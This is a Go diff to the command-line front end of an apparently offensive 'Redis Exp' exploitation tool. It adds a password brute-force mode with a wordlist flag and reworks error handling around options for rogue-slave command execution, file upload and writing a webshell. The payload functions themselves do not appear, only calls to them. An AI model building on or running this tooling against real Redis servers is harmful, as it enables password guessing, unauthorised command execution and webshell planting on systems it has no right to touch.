@@ -3,6 +3,7 @@ package pkg
 import (
 	"github.com/urfave/cli/v2"
 	"os"
+	"strings"
 )
 
 var (
@@ -12,9 +13,12 @@ var (
 	upload   bool
 	lua      bool
 	getshell bool
+	brute    bool
+	pwdf     string
+	PWD      string
 )
 
-func Run() {
+func Help() {
 	app := &cli.App{
 		Name:  "Redis Exp",
 		Usage: "Redis 利用工具",
@@ -114,18 +118,60 @@ func Run() {
 				Usage:       "备份写 Webshell",
 				Destination: &getshell,
 			},
+
+			&cli.BoolFlag{
+				Name:        "brute",
+				Value:       false,
+				Usage:       "爆破密码",
+				Destination: &brute,
+			},
+			&cli.StringFlag{
+				Name:        "pwdf",
+				Usage:       "密码字典",
+				Destination: &pwdf,
+			},
 		},
 		Action: func(c *cli.Context) error {
+			Run()
+			return nil
+		},
+	}
 
-			if Rhost == "" || Lhost == "" {
-				Info("靓仔查看下帮助吧")
-				os.Exit(0)
-			} else {
-				RedisClient()
-				redisVersion()
+	err := app.Run(os.Args)
+	if err != nil {
+		Err(err)
+		return
+	}
+}
+
+func Run() {
+	if Rhost == "" {
+		Info("靓仔查看下帮助吧")
+		os.Exit(0)
+	} else {
+		err := RedisClient(PWD)
+		if err != nil {
+			if strings.Contains(err.Error(), "context deadline exceeded") {
+				Info("Redis 连接超时")
 			}
+
+			//Err(err)
+
+			if strings.Contains(err.Error(), "NOAUTH Authentication required.") {
+				Info("Redis 需要密码认证")
+			}
+			if strings.Contains(err.Error(), "ERR invalid password") {
+				Info("Redis 认证密码错误!")
+			}
+		}
+
+		if err == nil {
 			switch {
 			case exec:
+				if Lhost == "" {
+					Info("缺少 Lhost 参数")
+					os.Exit(0)
+				}
 				if console {
 					RedisSlave()
 					loopCmd("exec")
@@ -141,8 +187,8 @@ func Run() {
 				break
 
 			case upload:
-				if Rfile == "" || Lfile == "" {
-					Info("未设置  rfile | lfile 参数上传不了哦")
+				if Rfile == "" || Lfile == "" || Lhost == "" {
+					Info("rfile | lfile | lhost 参数不能为空")
 					os.Exit(0)
 				}
 				RedisUpload()
@@ -164,14 +210,17 @@ func Run() {
 				GetShell()
 				break
 			}
-
-			return nil
-		},
+		}
 	}
 
-	err := app.Run(os.Args)
-	if err != nil {
-		Err(err)
-		return
+	if brute {
+		if pwdf == "" {
+			Info("缺少字典参数 -pwdf")
+			os.Exit(0)
+		}
+		readPass(pwdf)
+		brutePWD()
+		os.Exit(0)
 	}
+
 }
